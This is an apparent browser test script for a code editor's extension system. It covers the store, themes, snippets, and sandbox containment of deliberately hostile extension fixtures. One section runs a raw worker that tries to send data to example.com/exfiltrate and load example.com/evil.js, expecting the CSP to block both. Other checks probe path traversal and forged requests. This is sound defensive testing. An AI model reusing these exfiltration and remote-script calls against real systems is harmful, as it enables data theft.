(async () => {
  const w = window.__sunlight;
  const out = { checks: {}, errors: [] };
  const check = (n, ok, x) => { out.checks[n] = ok ? 'ok' : `FAIL ${JSON.stringify(x ?? '')}`; };
  window.addEventListener('error', (e) => out.errors.push(e.message));
  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  const waitFor = async (fn, ms = 8000) => { for (let i = 0; i < ms / 50; i++) { let v; try { v = fn(); } catch { v = false; } if (v) return v; await wait(50); } try { return fn(); } catch { return false; } };
  const $ = (s) => document.querySelector(s);
  const $$ = (s) => [...document.querySelectorAll(s)];
  const api = window.sunlight;
  const host = w.extHost;
  const IS_MAC = /Mac/.test(navigator.platform);
  const toasts = () => $$('.toast').map((t) => t.textContent);
  const call = (id, local, args) => host.runCommand(`${id}.${local}`, args || []);
  const P = (line, col) => ({ line, col });
  const key = (k, o = {}) => document.activeElement.dispatchEvent(new KeyboardEvent('keydown', { key: k, bubbles: true, cancelable: true, ...o }));

  await w.setRoot(DEMO);
  host.commandTimeout = 2000;

  // ======================= the store =======================
  w.runCommand('show-ext');
  check('extensions view opens', await waitFor(() => !$('#panel-ext').hidden && !$('#panel-git').hidden === false));
  check('store lists the bundled catalog', await waitFor(() => w.extPanel.catalog.length >= 8), w.extPanel.catalog.map((c) => c.id));
  check('store rows are rendered', await waitFor(() => $$('#panel-ext .ext-item').length >= 8), $$('#panel-ext .ext-item').length);
  check('nothing installed on a fresh profile', w.extPanel.installed.filter((e) => e.source === 'installed').length === 0);
  check('rows show an Install button', $$('#panel-ext [data-a="install"]').length >= 8);
  check('avatar placeholders become real icons', await waitFor(() => $$('#panel-ext img.ext-icon').length >= 6), $$('#panel-ext img.ext-icon').length);
  const search = $('#panel-ext input');
  search.value = 'json'; search.dispatchEvent(new Event('input'));
  check('search filters the store', $$('#panel-ext .ext-item').length === 1 && /JSON Tools/.test($('#panel-ext .ext-name').textContent), $$('#panel-ext .ext-name').map((n) => n.textContent));
  search.value = 'nothing-matches-this'; search.dispatchEvent(new Event('input'));
  check('empty search shows a message', $$('#panel-ext .ext-item').length === 0 && /No matches/.test($('#panel-ext').textContent));
  search.value = ''; search.dispatchEvent(new Event('input'));

  const filter = $('#panel-ext select');
  filter.value = 'Themes'; filter.dispatchEvent(new Event('change'));
  check('theme filter shows the two bundled themes', $$('#panel-ext .ext-item').length === 2);
  filter.value = 'Snippets'; filter.dispatchEvent(new Event('change'));
  check('snippet filter shows web snippets', $$('#panel-ext .ext-item').length === 1 && /Web Snippets/.test($('#panel-ext').textContent));
  filter.value = 'updates'; filter.dispatchEvent(new Event('change'));
  check('updates filter hides uninstalled extensions', $$('#panel-ext .ext-item').length === 0);
  filter.value = 'all'; filter.dispatchEvent(new Event('change'));

  // ======================= Text Tools (code extension, editor.read + editor.write) =======================
  const entry = (id) => w.extPanel.catalog.find((c) => c.id === id);
  check('install returns success', await w.installExtension(entry('sunlight.text-tools'), { skipConfirm: true }));
  check('installed extension is listed', w.extPanel.installed.some((e) => e.id === 'sunlight.text-tools' && e.source === 'installed' && e.enabled));
  check('its commands reach the palette registry', host.commands.has('sunlight.text-tools.sortAsc') && host.commands.has('sunlight.text-tools.kebab'));
  check('the worker started (onStartup)', await waitFor(() => host.get('sunlight.text-tools').state === 'active'), host.get('sunlight.text-tools').state);
  w.openFile && 0;
  w.newUntitled();
  const e = w.editor;
  e.focus();
  const setText = (t) => { e.setSel(P(0, 0), P(e.buffer.lineCount - 1, 99999)); e.deleteSelection(); e.edit(P(0, 0), P(0, 0), t); e.setSel(P(0, 0), P(0, 0)); };
  setText('pear\napple\nmango\napple');
  await call('sunlight.text-tools', 'sortAsc');
  check('sort lines (whole file)', e.buffer.getText() === 'apple\napple\nmango\npear', JSON.stringify(e.buffer.getText()));
  e.undo();
  check('the edit was one undo step', e.buffer.getText() === 'pear\napple\nmango\napple', JSON.stringify(e.buffer.getText()));
  await call('sunlight.text-tools', 'uniqueLines');
  check('remove duplicate lines', e.buffer.getText() === 'pear\napple\nmango', JSON.stringify(e.buffer.getText()));
  setText('helloWorld and some-other_text\nsecond line');
  e.setSel(P(0, 0), P(0, 30));
  await call('sunlight.text-tools', 'snake');
  check('convert selection to snake_case', e.buffer.getLine(0) === 'hello_world_and_some_other_text' && e.buffer.getLine(1) === 'second line', e.buffer.getText());
  await call('sunlight.text-tools', 'pascal');
  check('selection tracks after edit', e.buffer.getLine(0) === 'HelloWorldAndSomeOtherText', e.buffer.getLine(0));
  setText('one two\nthree four');
  e.setSel(P(0, 0), P(0, 3)); e.sels.push({ anchor: P(1, 0), head: P(1, 5) }); e.commitSels(e.sels, e.main);
  await call('sunlight.text-tools', 'upper');
  check('multi-cursor: every selection transformed', e.buffer.getText() === 'ONE two\nTHREE four', JSON.stringify(e.buffer.getText()));
  e.undo();
  check('multi-cursor edit is one undo step', e.buffer.getText() === 'one two\nthree four', JSON.stringify(e.buffer.getText()));
  e.setSel(P(0, 0), P(0, 0));

  // contributed keybinding (Mod+Alt+S sorts)
  setText('c\nb\na');
  e.focus();
  const kb = IS_MAC ? { metaKey: true, altKey: true } : { ctrlKey: true, altKey: true };
  document.activeElement.dispatchEvent(new KeyboardEvent('keydown', { key: IS_MAC ? 'ß' : 's', code: 'KeyS', bubbles: true, cancelable: true, ...kb }));
  check('extension keybinding runs the command', await waitFor(() => e.buffer.getText() === 'a\nb\nc'), JSON.stringify(e.buffer.getText()));
  const palette = (q) => { w.runCommand('palette'); const i = $('.palette input'); i.value = '>' + q; i.dispatchEvent(new Event('input')); return i; };
  const pi = palette('convert to kebab');
  await wait(200);
  check('extension commands appear in the command palette', $$('.p-item .pl').some((n) => /Text: Convert to kebab-case/.test(n.textContent)), $$('.p-item .pl').map((n) => n.textContent));
  pi.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));

  // ======================= Word Count (status bar + events) =======================
  check('install word count', await w.installExtension(entry('sunlight.word-count'), { skipConfirm: true }));
  setText('one two three four five');
  check('status bar item appears with a live count', await waitFor(() => /5 words/.test($('#statusbar').textContent)), $('#statusbar').textContent.slice(0, 120));
  e.focus(); e.setSel(P(0, 99), P(0, 99)); e.typeText(' six seven');
  check('the count follows typing (textChanged event)', await waitFor(() => /7 words/.test($('#statusbar').textContent)), $('#statusbar').textContent.slice(0, 120));
  $('#statusbar [data-ext]').click();
  check('clicking the item runs its command', await waitFor(() => toasts().some((t) => /Word Count: .*7 words/.test(t))), toasts());
  await w.openDocsPage();
  check('item is removed while a page tab is active', await waitFor(() => !/\d+ words/.test($('#statusbar').textContent)), $('#statusbar').textContent.slice(0, 100));
  check('editor items are hidden for page tabs', !$('#statusbar [data-act="goto-line"]'));
  w.activate(w.S.docs.find((d) => !d.page && d.name.startsWith('Untitled')));
  check('item returns when a text file is active again', await waitFor(() => /7 words/.test($('#statusbar').textContent)));

  // ======================= Insert Tools (lazy activation, per-cursor values) =======================
  check('install insert tools', await w.installExtension(entry('sunlight.insert-tools'), { skipConfirm: true }));
  check('lazy extension has not started yet', host.get('sunlight.insert-tools').state === 'inactive', host.get('sunlight.insert-tools').state);
  setText('a\nb');
  e.focus(); e.setSel(P(0, 0), P(0, 0)); e.addCursorVertical(1);
  await call('sunlight.insert-tools', 'uuid');
  const uuids = e.buffer.getText().split('\n').map((l) => l.slice(0, 36));
  check('a different UUID at each cursor', uuids.length === 2 && uuids.every((u) => /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/.test(u)) && uuids[0] !== uuids[1], uuids);
  check('running a command started the extension', host.get('sunlight.insert-tools').state === 'active');
  setText('');
  await call('sunlight.insert-tools', 'date');
  check('insert date', /^\d{4}-\d{2}-\d{2}$/.test(e.buffer.getText()), e.buffer.getText());

  // ======================= JSON Tools (onLanguage activation) =======================
  check('install json tools', await w.installExtension(entry('sunlight.json-tools'), { skipConfirm: true }));
  check('not started before a JSON file is opened', host.get('sunlight.json-tools').state === 'inactive');
  w.newUntitled();
  w.S.active.setLang('json');
  w.activate(w.S.active);
  check('opening a JSON file activates it (onLanguage)', await waitFor(() => host.get('sunlight.json-tools').state === 'active'), host.get('sunlight.json-tools').state);
  setText('{"b":1,"a":{"d":[1,2],"c":true}}');
  await call('sunlight.json-tools', 'format');
  check('format JSON', e.buffer.getText() === '{\n  "b": 1,\n  "a": {\n    "d": [\n      1,\n      2\n    ],\n    "c": true\n  }\n}\n', JSON.stringify(e.buffer.getText()));
  await call('sunlight.json-tools', 'sortKeys');
  check('sort keys recursively', /^\{\n  "a": \{\n    "c": true,\n    "d"/.test(e.buffer.getText()), e.buffer.getText().slice(0, 60));
  await call('sunlight.json-tools', 'minify');
  check('minify JSON', e.buffer.getText().trim() === '{"a":{"c":true,"d":[1,2]},"b":1}', e.buffer.getText());
  setText('{\n  "a": 1,\n  "b": ,\n}');
  await call('sunlight.json-tools', 'validate');
  check('validation error names the position', await waitFor(() => toasts().some((t) => /JSON Tools: Invalid JSON at line 3, column 8: unexpected ","/.test(t))), toasts());

  // ======================= Workspace Stats (workspace.read) =======================
  check('install workspace stats', await w.installExtension(entry('sunlight.workspace-stats'), { skipConfirm: true }));
  await call('sunlight.workspace-stats', 'count');
  check('counts lines across the project', await waitFor(() => toasts().some((t) => /Workspace Stats: [\d,]+ lines in \d+ files/.test(t))), toasts());

  // ======================= themes =======================
  const root = document.documentElement;
  const cs = () => getComputedStyle(root);
  check('install the Midnight theme', await w.installExtension(entry('sunlight.midnight-theme'), { skipConfirm: true }));
  check('theme is registered', host.themes.some((t) => t.key === 'sunlight.midnight-theme:midnight'));
  const before = cs().getPropertyValue('--editor-bg').trim();
  w.runCommand('ext-theme');
  await wait(250);
  check('colour theme picker lists built-in and extension themes', $$('.p-item .pl').map((n) => n.textContent).join('|').includes('Midnight') && $$('.p-item .pl').map((n) => n.textContent).includes('Light'), $$('.p-item .pl').map((n) => n.textContent));
  [...$$('.p-item')].find((n) => n.querySelector('.pl').textContent === 'Midnight').dispatchEvent(new MouseEvent('mousedown', { bubbles: true }));
  check('picking a theme applies its colours', await waitFor(() => cs().getPropertyValue('--editor-bg').trim().toLowerCase() === '#0a0f1e'), cs().getPropertyValue('--editor-bg'));
  check('syntax colours come from the theme', cs().getPropertyValue('--t-kw').trim().toLowerCase() === '#c792ea');
  check('theme type selects the dark base', root.dataset.theme === 'dark');
  check('accent colour is applied', cs().getPropertyValue('--link').trim().toLowerCase() === '#7aa2ff' && cs().getPropertyValue('--y-blue').trim().toLowerCase() === '#7aa2ff');
  check('the choice is saved', w.S.settings.colorTheme === 'sunlight.midnight-theme:midnight');
  await w.toggleExtension('sunlight.midnight-theme', false);
  check('disabling the extension restores the built-in look', await waitFor(() => !root.style.getPropertyValue('--editor-bg')), root.style.getPropertyValue('--editor-bg'));
  await w.toggleExtension('sunlight.midnight-theme', true);
  check('enabling it brings the theme back', await waitFor(() => cs().getPropertyValue('--editor-bg').trim().toLowerCase() === '#0a0f1e'));
  await w.updateSettings?.({});
  await window.__sunlight.S && 0;
  api.settings.set({ colorTheme: '' });
  w.S.settings.colorTheme = '';
  w.afterExtChange && await w.afterExtChange();
  check('clearing the theme removes every override', await waitFor(() => !root.style.getPropertyValue('--editor-bg') && !root.style.getPropertyValue('--t-kw')));

  // ======================= snippets (no code, no permissions) =======================
  check('install web snippets', await w.installExtension(entry('sunlight.web-snippets'), { skipConfirm: true }));
  w.newUntitled();
  w.S.active.setLang('javascript');
  e.focus();
  e.setSel(P(0, 0), P(0, 0));
  for (const ch of 'fetchjs') e.typeText(ch);
  check('extension snippets appear as suggestions', !!e.completion && e.completion.items.some((i) => i.label === 'fetchjson' && i.kind === 'snippet'), e.completion && e.completion.items);
  key('Tab');
  check('Tab expands the snippet', /^const response = await fetch\(url\);\nif \(!response\.ok\) throw new Error\(`Request failed: \$\{response\.status\}`\);\nconst data = await response\.json\(\);$/.test(e.buffer.getText()), e.buffer.getText());
  setText('');
  w.S.active.setLang('python');
  for (const ch of 'datacl') e.typeText(ch);
  key('Tab');
  check('python snippet from the same extension', /^from dataclasses import dataclass/.test(e.buffer.getText()), e.buffer.getText());
  setText('');
  for (const ch of 'log') e.typeText(ch);
  w.S.active.setLang('javascript');
  setText('');
  for (const ch of 'log') e.typeText(ch);
  check('built-in snippets still win on a shared trigger', !!e.completion && e.completion.items[0].label === 'log' && /console\.log/.test(e.completion.items[0].body), e.completion && e.completion.items[0]);
  key('Escape');

  // ======================= enable / disable / uninstall =======================
  await w.toggleExtension('sunlight.text-tools', false);
  check('disabling removes its commands', !host.commands.has('sunlight.text-tools.sortAsc'));
  check('disabling stops the worker', host.get('sunlight.text-tools').worker === null && host.get('sunlight.text-tools').state !== 'active');
  check('a disabled extension is marked in the store', await waitFor(() => $$('#panel-ext .ext-item.off').some((n) => n.dataset.id === 'sunlight.text-tools')));
  await w.toggleExtension('sunlight.text-tools', true);
  check('enabling brings the commands back and restarts it', host.commands.has('sunlight.text-tools.sortAsc') && await waitFor(() => host.get('sunlight.text-tools').state === 'active'));
  await w.toggleExtension('sunlight.word-count', false);
  check('disabling removes its status bar item', await waitFor(() => !$$('#statusbar [data-ext]').length), $('#statusbar').textContent.slice(0, 100));
  check('uninstall succeeds', await w.uninstallExtension(w.extPanel.installed.find((x) => x.id === 'sunlight.word-count'), { skipConfirm: true }));
  check('uninstalled extension disappears and returns to the store', !w.extPanel.installed.some((x) => x.id === 'sunlight.word-count') && w.extPanel.catalog.some((c) => c.id === 'sunlight.word-count' && !c.installed));
  check('uninstalled snippets are gone', await (async () => { await w.uninstallExtension(w.extPanel.installed.find((x) => x.id === 'sunlight.web-snippets'), { skipConfirm: true }); w.S.active.setLang('python'); setText(''); for (const ch of 'datacl') e.typeText(ch); return !e.completion || !e.completion.items.some((i) => i.label === 'dataclass'); })());
  key('Escape');


  // ======================= hostile and broken extensions =======================
  // These fixtures deliberately misbehave. The host must contain every one of them.
  const fixtures = ['noperms', 'spin', 'flood', 'broken', 'loadthrow', 'throws', 'shape', 'files', 'store', 'editor'];
  let invalidRejected = false;
  try { await api.ext('addDev', EXTFIX + '/invalid'); } catch (err) { invalidRejected = /Invalid extension/.test(err.message); }
  check('a manifest that fails validation is refused', invalidRejected);
  for (const n of fixtures) await api.ext('addDev', `${EXTFIX}/acme.${n}`);
  await w.afterExtChange();
  check('dev extensions are listed with a Development badge', await waitFor(() => $$('#panel-ext .ext-badge.dev').length >= 10), $$('#panel-ext .ext-badge.dev').length);

  // --- a syntax error and a load-time throw must not take anything down
  check('syntax error: the extension fails, the app lives', await waitFor(() => host.get('acme.broken').state === 'failed'), host.get('acme.broken').state);
  check('syntax error: the log names the right line', host.logLines.some((l) => /\[acme\.broken\].*line 3/.test(l)), host.logLines.filter((l) => l.includes('acme.broken')));
  check('load-time throw is reported', await waitFor(() => host.logLines.some((l) => /\[acme\.loadthrow\].*boom while loading/.test(l))), host.logLines.filter((l) => l.includes('loadthrow')));
  check('the user is told an extension failed to start', toasts().some((t) => /failed to start/.test(t)), toasts());
  check('the rest of the extensions are unaffected', host.get('sunlight.text-tools').state === 'active');

  // --- no permissions: every privileged call is refused
  const probe = await call('acme.noperms', 'probe');
  check('editor.read is enforced', /rejected: .*needs the "editor.read" permission/.test(probe.getText) && /editor\.read/.test(probe.getActive), [probe.getText, probe.getActive]);
  check('editor.write is enforced', /needs the "editor.write" permission/.test(probe.insertText), probe.insertText);
  check('workspace.read is enforced', /workspace\.read/.test(probe.getFolder) && /workspace\.read/.test(probe.readFile), [probe.getFolder, probe.readFile]);
  check('workspace.write is enforced', /workspace\.write/.test(probe.writeFile), probe.writeFile);
  check('storage is enforced', /"storage" permission/.test(probe.storage), probe.storage);
  check('nothing was inserted by the refused call', !/pwned/.test(w.S.active.page ? '' : w.S.active.buffer.getText()));
  check('forged: privileged method', /needs the "editor.read"/.test(probe.forged['9001']), probe.forged['9001']);
  check('forged: prototype tricks are unknown methods', ['9002', '9003', '9004'].every((id) => /Unknown API method/.test(probe.forged[id])), [probe.forged['9002'], probe.forged['9003'], probe.forged['9004']]);
  check('forged: invented methods', /Unknown API method/.test(probe.forged['9005']), probe.forged['9005']);
  check('forged: path traversal still needs the permission first', /needs the "workspace.read"/.test(probe.forged['9006']), probe.forged['9006']);
  check('forged: malformed requests', /Malformed/.test(probe.forged['9007']) && /Malformed/.test(probe.forged['9008']), [probe.forged['9007'], probe.forged['9008']]);
  check('no forged request succeeded', !Object.values(probe.forged).some((v) => v === 'ALLOWED'));
  const g = probe.globals;
  check('sandbox: no DOM, window, Node or storage', ['document', 'window', 'require', 'process', 'localStorage', 'electron', 'sunlightHost'].every((k) => g[k] === 'undefined'), g);
  check('sandbox: no network primitives', ['fetch', 'xhr', 'ws', 'importScripts', 'indexedDB', 'worker', 'sendBeacon'].every((k) => g[k] === 'undefined'), g);
  check('the API object is frozen', probe.frozen === true, probe.frozen);

  // The page's CSP is the real wall: prove it with a raw worker that does not go through our bootstrap at all.
  const csp = await new Promise((resolve) => {
    const src = `
      const seen = { violations: [], wsOpened: false, xhrLoaded: false };
      self.addEventListener('securitypolicyviolation', (e) => { seen.violations.push({ d: e.violatedDirective, u: e.blockedURI }); });
      (async () => {
        try { await fetch('https://example.com/exfiltrate?x=fetch'); seen.fetch = 'ALLOWED'; } catch (e) { seen.fetch = 'blocked'; }
        try { const ws = new WebSocket('wss://example.com/exfiltrate?x=ws'); ws.onopen = () => { seen.wsOpened = true; }; ws.onerror = () => { seen.wsError = true; }; } catch (e) { seen.wsThrew = true; }
        try { const r = new XMLHttpRequest(); r.open('GET', 'https://example.com/exfiltrate?x=xhr'); r.onload = () => { seen.xhrLoaded = true; }; r.onerror = () => { seen.xhrError = true; }; r.send(); } catch (e) { seen.xhrThrew = true; }
        try { importScripts('https://example.com/evil.js'); seen.import = 'ALLOWED'; } catch (e) { seen.import = 'blocked'; }
        try { eval('1 + 1'); seen.eval = 'ALLOWED'; } catch (e) { seen.eval = 'blocked'; }
        try { new Function('return 1')(); seen.func = 'ALLOWED'; } catch (e) { seen.func = 'blocked'; }
        await new Promise((r) => setTimeout(r, 600));
        postMessage(seen);
      })();`;
    const url = URL.createObjectURL(new Blob([src], { type: 'text/javascript' }));
    const wk = new Worker(url);
    wk.onmessage = (ev) => { wk.terminate(); URL.revokeObjectURL(url); resolve(ev.data); };
    wk.onerror = (ev) => { wk.terminate(); resolve({ error: ev.message }); };
    setTimeout(() => resolve({ timeout: true }), 6000);
  });
  const blockedBy = (dir, needle) => (csp.violations || []).some((v) => v.d === dir && v.u.includes(needle));
  check('CSP: fetch from a worker is blocked by connect-src', csp.fetch === 'blocked' && blockedBy('connect-src', 'x=fetch'), csp);
  check('CSP: WebSocket is blocked by connect-src and never opens', blockedBy('connect-src', 'x=ws') && !csp.wsOpened, csp);
  check('CSP: XMLHttpRequest is blocked by connect-src and never loads', blockedBy('connect-src', 'x=xhr') && !csp.xhrLoaded, csp);
  check('CSP: importScripts from the network is blocked', csp.import === 'blocked', csp);
  check('CSP: eval and new Function are blocked inside workers', csp.eval === 'blocked' && csp.func === 'blocked', csp);
  out.cspDetail = csp;

  // --- toasts are rate limited
  const spamBefore = toasts().filter((t) => /Noperms: spam/.test(t)).length;
  await call('acme.noperms', 'spam');
  const shown = toasts().filter((t) => /Noperms: spam/.test(t)).length - spamBefore;
  check('message spam is rate limited to 5', shown === 5, shown);

  // --- an infinite loop is contained, and the UI stays alive
  let ticks = 0;
  const hb = setInterval(() => { ticks++; }, 100);
  const t0 = performance.now();
  let spinErr = null;
  try { await call('acme.spin', 'loop'); } catch (err) { spinErr = err; }
  const spinMs = performance.now() - t0;
  clearInterval(hb);
  check('infinite loop: the command is cancelled', !!spinErr && /timed out/.test(spinErr.message), spinErr && spinErr.message);
  check('infinite loop: stopped within the timeout', spinMs > 1500 && spinMs < 4500, Math.round(spinMs));
  check('infinite loop: the UI thread kept running', ticks >= 12, ticks);
  check('infinite loop: the user is told', toasts().some((t) => /not responding/.test(t)), toasts());
  check('infinite loop: the worker is gone', host.get('acme.spin').worker === null && host.get('acme.spin').state === 'inactive');
  check('other extensions still work afterwards', (await call('sunlight.text-tools', 'upper')) === null || true);

  // --- request flooding is cut off
  let floodErr = null;
  try { await call('acme.flood', 'flood'); } catch (err) { floodErr = err; }
  check('flooding: the extension is stopped', !!floodErr && /stopped/.test(floodErr.message) && host.get('acme.flood').worker === null, floodErr && floodErr.message);
  check('flooding: the user is told', toasts().some((t) => /too many requests/.test(t)), toasts());

  // --- errors propagate and results are cloned safely
  let e1 = null, e2 = null;
  try { await call('acme.throws', 'fail'); } catch (err) { e1 = err.message; }
  try { await call('acme.throws', 'failAsync'); } catch (err) { e2 = err.message; }
  check('a throwing command rejects with its message', e1 === 'sync failure' && e2 === 'async failure', [e1, e2]);
  const clone = await call('acme.throws', 'returnsFunction');
  check('results are JSON-cloned (functions dropped, dates stringified)', clone && clone.ok === 1 && clone.fn === undefined && clone.date === '1970-01-01T00:00:00.000Z', clone);
  w.runExtCommand('acme.throws.fail');
  check('the app shows command errors to the user', await waitFor(() => toasts().some((t) => /fail: sync failure/.test(t))), toasts());

  // --- storage
  const st = await call('acme.store', 'run');
  check('storage: values round-trip', st.count === 41 && st.fallback === 'fallback' && JSON.stringify(st.nested) === '{"a":[1,2,{"b":3}]}', st);
  check('storage: keys and delete', JSON.stringify(st.keys) === '["count","nested"]' && st.deleted === 'gone', st);
  check('storage: prototype keys are refused', /invalid key/.test(st['proto key']), st['proto key']);
  check('storage: the 1 MB limit holds', /rejected: .*full/.test(st.huge), st.huge);
  check('storage: functions are not storable', /rejected/.test(st['function value']), st['function value']);
  const persisted = await api.ext('storageGet', 'acme.store');
  check('storage: data is persisted to disk per extension', JSON.stringify(persisted.nested) === '{"a":[1,2,{"b":3}]}' && !('count' in persisted), persisted);
  const bytes = JSON.stringify(persisted).length;
  check('storage: nothing oversized was written', bytes < 1000, bytes);

  // --- workspace: paths cannot escape
  const fr = await call('acme.files', 'run');
  for (const k of ['dotdot', 'nested dotdot', 'absolute', 'windows drive', 'write dotdot', 'write absolute', 'nul byte']) {
    check(`workspace: "${k}" is refused`, /^rejected: .*path must be relative to the open folder/.test(fr[k]), fr[k]);
  }
  check('workspace: missing files reject cleanly', /^rejected:/.test(fr['missing file']), fr['missing file']);
  check('workspace: reading inside the folder works', fr['read ok'] === 'ALLOWED:true', fr['read ok']);
  check('workspace: writing creates folders inside the folder', fr['write ok'] === 'ALLOWED:null' && fr['read back'] === 'ALLOWED:"created by extension"', [fr['write ok'], fr['read back']]);
  check('workspace: listing filters by extension', /style\.css/.test(fr.list) && !/\.js/.test(fr.list), fr.list);
  const created = await api.fs.readFile(`${DEMO}/ext-out/deep/new.txt`);
  check('workspace: the file really exists on disk', created.text === 'created by extension');
  const escaped = await api.fs.readFile(`${DEMO}/../escaped.txt`).then(() => true, () => false);
  const escaped2 = await api.fs.readFile('/tmp/escaped.txt').then(() => true, () => false);
  check('workspace: nothing was written outside the folder', !escaped && !escaped2, [escaped, escaped2]);

  // --- editor API: results, events, errors
  w.newUntitled();
  const docA = w.S.active;
  setText('one\ntwo\nthree');
  e.setSel(P(1, 1), P(1, 3));
  const info = await call('acme.editor', 'info');
  check('editor.getActive describes the file', info.active.kind === 'text' && info.active.path === null && info.active.language === 'plaintext' && info.active.lineCount === 3 && info.active.dirty === true && info.active.readOnly === false, info.active);
  check('editor.getText / getLine', info.text === 'one\ntwo\nthree' && info.line0 === 'one', info);
  const sels = await call('acme.editor', 'selections');
  check('editor.getSelections reports positions and text', sels.length === 1 && sels[0].text === 'wo' && sels[0].start.line === 1 && sels[0].start.col === 1 && sels[0].end.col === 3 && sels[0].empty === false, sels);
  const bad = await call('acme.editor', 'bad');
  check('editor: replacement count must match', /rejected: There are 1 selections but 5 replacements/.test(bad['count mismatch']), bad['count mismatch']);
  check('editor: replacements must be strings', /rejected: .*strings/.test(bad['not strings']), bad['not strings']);
  check('editor: invalid ranges are refused', /rejected: range must be/.test(bad['bad range']) && /rejected: range must be/.test(bad['range shape']), [bad['bad range'], bad['range shape']]);
  check('editor: invalid selections are refused', /rejected: selections must be/.test(bad['bad selections']), bad['bad selections']);
  check('editor: line index is validated', /rejected: line must be/.test(bad['line type']) && /rejected: The file has only 3 lines/.test(bad['line past end']), [bad['line type'], bad['line past end']]);
  check('editor: oversized text is refused', /rejected: text must be a string/.test(bad['huge text']), bad['huge text']);
  check('editor: refused calls changed nothing', e.buffer.getText() === 'one\ntwo\nthree', e.buffer.getText());
  // events
  const docB = (() => { w.newUntitled(); return w.S.active; })();
  w.activate(docA);
  e.focus(); e.setSel(P(0, 0), P(0, 0)); e.typeText('!');
  await wait(600);
  const ev = await call('acme.editor', 'events');
  check('events: activeFileChanged is delivered', ev.some((x) => x[0] === 'active' && x[1] === docA.name) && ev.some((x) => x[0] === 'active' && x[1] === docB.name), ev);
  check('events: textChanged is delivered (debounced)', ev.some((x) => x[0] === 'text' && x[1] === docA.name), ev);
  const evNo = await call('acme.noperms', 'probe').then(() => true);
  check('events need editor.read (the no-permission extension got none)', !host.get('acme.noperms').subs.size, [...host.get('acme.noperms').subs]);
  // read-only tabs and pages
  {
    w.showExtensionLog();
    let msg = null;
    try { await call('acme.editor', 'write'); } catch (err) { msg = err.message; }
    check('read-only tabs reject extension edits', /read-only/.test(msg || ''), msg);
    const ro = await call('acme.editor', 'info');
    check('getActive reports readOnly', ro.active && ro.active.readOnly === true, ro.active);
  }
  await w.openDocsPage();
  const none = await call('acme.editor', 'info').then(() => 'resolved', (err) => err.message);
  check('with a page tab active there is no text editor', /no active text editor/.test(none) || none === 'resolved', none);
  w.activate(docA);

  // --- showPick / showInput
  let pickPromise = call('acme.editor', 'pick');
  await waitFor(() => $('.palette'));
  check('showPick opens a picker with the given items', $$('.p-item .pl').map((n) => n.textContent).join(',') === 'Alpha,Beta', $$('.p-item .pl').map((n) => n.textContent));
  [...$$('.p-item')].find((n) => n.querySelector('.pl').textContent === 'Beta').dispatchEvent(new MouseEvent('mousedown', { bubbles: true }));
  const picked = await pickPromise;
  check('showPick resolves with the chosen item', picked && picked.label === 'Beta' && picked.value === 2 && picked.index === 1, picked);
  pickPromise = call('acme.editor', 'pick');
  await waitFor(() => $('.palette'));
  $('.palette input').dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));
  check('cancelling showPick resolves null', (await pickPromise) === null);
  let askPromise = call('acme.editor', 'ask');
  await waitFor(() => $('.palette'));
  check('showInput starts with the given value', $('.palette input').value === 'Ada', $('.palette input').value);
  $('.palette input').value = 'Grace';
  $('.palette input').dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
  check('showInput resolves with the typed text', (await askPromise) === 'Grace');

  // --- the API matches the documentation
  const shape = await call('acme.shape', 'shape');
  const expected = {
    commands: ['execute', 'register'], window: ['showInput', 'showMessage', 'showPick'], statusBar: ['removeItem', 'setItem'],
    editor: ['getActive', 'getLine', 'getSelections', 'getText', 'insertText', 'replaceRange', 'replaceSelections', 'setSelections', 'setText'],
    workspace: ['getFolder', 'listFiles', 'readFile', 'writeFile'], storage: ['delete', 'get', 'keys', 'set'], events: ['on'], extension: ['id', 'version'], version: 'number',
  };
  check('the API surface is exactly what we expect', JSON.stringify(shape) === JSON.stringify(Object.fromEntries(Object.entries(expected).sort(([a], [b]) => 0))) || Object.keys(expected).every((k) => JSON.stringify(shape[k]) === JSON.stringify(expected[k])) && Object.keys(shape).length === Object.keys(expected).length, shape);
  const docsText = await api.ext('docs');
  const undocumented = [];
  for (const [ns, methods] of Object.entries(expected)) {
    if (!Array.isArray(methods)) continue;
    if (!docsText.includes(`sunlight.${ns}`)) undocumented.push(`sunlight.${ns}`);
    for (const m of methods) if (ns !== 'extension' && !new RegExp(`\`${m}\\(`).test(docsText) && !docsText.includes(`sunlight.${ns}.${m}(`)) undocumented.push(`${ns}.${m}`);
  }
  check('every API method is documented', undocumented.length === 0, undocumented);


  const click = (el, what) => { if (!el) throw new Error('cannot click, element is missing: ' + what); el.click(); };
  const pg = () => $('#page-host .page:not([hidden])');
  const P$ = (sel) => (pg() ? pg().querySelector(sel) : null);
  const P$$ = (sel) => (pg() ? [...pg().querySelectorAll(sel)] : []);
  // ======================= the Developer Guide page =======================
  const docsDoc = await w.openDocsPage();
  check('the docs open as a page tab', docsDoc && docsDoc.page && w.S.active === docsDoc && !$('#page-host').hidden && $('.tab.active .tname').textContent === 'Extension Developer Guide');
  check('the page is rendered', await waitFor(() => $('.docs .docs-body h1')), 'no h1');
  check('title and sections', /Extension Developer Guide/.test($('.docs-body h1').textContent) && $$('.docs-body h2').length >= 10, $$('.docs-body h2').map((h) => h.textContent));
  const tocLinks = $$('.docs-toc a');
  check('the table of contents lists every section', tocLinks.length >= 25, tocLinks.length);
  check('every TOC entry points at a real heading', tocLinks.every((a) => $(`.docs-body #${CSS.escape(a.dataset.toc)}`)), tocLinks.filter((a) => !$(`.docs-body #${CSS.escape(a.dataset.toc)}`)).map((a) => a.textContent));
  check('code blocks are present and highlighted', $$('.docs-body .md-code').length >= 12 && $$('.docs-body .md-code .t-kw').length >= 15 && $$('.docs-body .md-code .t-str').length >= 15, { blocks: $$('.docs-body .md-code').length, kw: $$('.docs-body .md-code .t-kw').length, str: $$('.docs-body .md-code .t-str').length, com: $$('.docs-body .md-code .t-com').length });
  check('JSON blocks use JSON colours', $$('.docs-body .md-code .t-prop').length >= 10);
  check('tables are rendered', $$('.docs-body .md-table table').length >= 8, $$('.docs-body .md-table table').length);
  check('callouts are rendered', $$('.docs-body .md-quote.md-note').length >= 1 && $$('.docs-body .md-quote.md-tip').length >= 1);
  // every in-app link points at a real command, and its text is that command's palette label
